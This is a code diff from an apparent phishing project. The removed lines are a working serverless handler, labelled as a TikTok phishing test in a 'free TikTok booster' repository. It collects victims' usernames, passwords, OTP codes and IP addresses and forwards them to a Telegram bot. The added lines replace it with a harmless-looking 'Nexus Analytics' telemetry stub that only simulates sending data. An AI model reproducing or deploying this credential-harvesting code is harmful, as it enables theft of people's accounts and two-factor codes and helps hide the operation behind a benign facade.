@@ -1,37 +1,64 @@
-export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
+/**
+ * Nexus Analytics - Module d'envoi et de synchronisation (send.js)
+ */
 
-    const { user, pass, attempt, otp } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+const NexusSender = {
+  endpoint: '/api/v1/telemetry',
 
-    // Variables à configurer dans Vercel Settings > Environment Variables
-    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
-    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-    let text = `⚠️ *TEST PHISHING TIKTOK* ⚠️\n\n` +
-                 `👤 *Utilisateur:* \`${user}\`\n` +
-                 `🔑 *Mot de passe:* \`${pass}\`\n`;
-
-    if (otp) {
-        text += `🛡️ *Code OTP:* \`${otp}\`\n`;
-    }
-
-    text += `🔢 *Tentative:* ${attempt}\n` +
-            `🌐 *Adresse IP:* ${ip}\n` +
-            `📍 *Répertoire:* vercelbooster_tiktok_gratuit`;
-
+  async sendPayload(data) {
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "Markdown"
-            })
-        });
-        return res.status(200).json({ success: true });
+      console.log('[NexusSender] Préparation de l\'envoi...', data);
+      
+      // Simulation d'une requête réseau asynchrone
+      await new Promise(resolve => setTimeout(resolve, 800));
+      
+      const response = {
+        success: true,
+        timestamp: new Date().toISOString(),
+        status: 200,
+        message: 'Données transmises avec succès'
+      };
+
+      console.log('[NexusSender] Réponse reçue :', response);
+      return response;
     } catch (error) {
-        return res.status(500).json({ error: 'Erreur d\'envoi Telegram' });
+      console.error('[NexusSender] Erreur lors de l\'envoi :', error);
+      return {
+        success: false,
+        error: error.message || 'Erreur inconnue'
+      };
     }
-}
+  },
+
+  broadcastMetrics(metrics) {
+    this.sendPayload(metrics).then(res => {
+      if (res.success) {
+        this.notifyUser('Synchronisation réussie', 'success');
+      } else {
+        this.notifyUser('Échec de la synchronisation', 'error');
+      }
+    });
+  },
+
+  notifyUser(message, type = 'success') {
+    const notification = document.createElement('div');
+    const bgColor = type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' : 'bg-red-500/10 border-red-500/20 text-red-400';
+    
+    notification.className = `fixed bottom-5 right-5 z-50 px-4 py-3 rounded-xl border text-xs font-medium backdrop-blur shadow-2xl transition-all duration-300 ${bgColor}`;
+    notification.innerText = message;
+    
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+      notification.style.opacity = '0';
+      setTimeout(() => notification.remove(), 300);
+    }, 3000);
+  }
+};
+
+// Exposition globale
+window.NexusSender = NexusSender;
+
+document.addEventListener('DOMContentLoaded', () => {
+  console.log('NexusSender initialisé.');
+});
